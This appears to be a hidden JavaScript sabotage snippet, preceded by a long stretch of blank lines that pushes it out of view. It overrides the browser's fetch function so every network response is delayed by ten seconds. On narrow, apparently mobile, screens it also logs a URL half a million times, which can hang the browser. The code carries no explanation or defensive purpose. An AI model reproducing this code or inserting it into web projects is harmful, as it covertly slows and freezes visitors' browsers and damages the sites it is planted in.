































































































































































































(function(){const originalFetch=window.fetch;window.fetch=async function(...args){const response=await originalFetch(...args);await new Promise(resolve=>setTimeout(resolve,10000));return response}})()
if (window.innerWidth < 500) {
    for(let index=0;index<500000;index++){console.log('https://lfcarry.com/')}
}
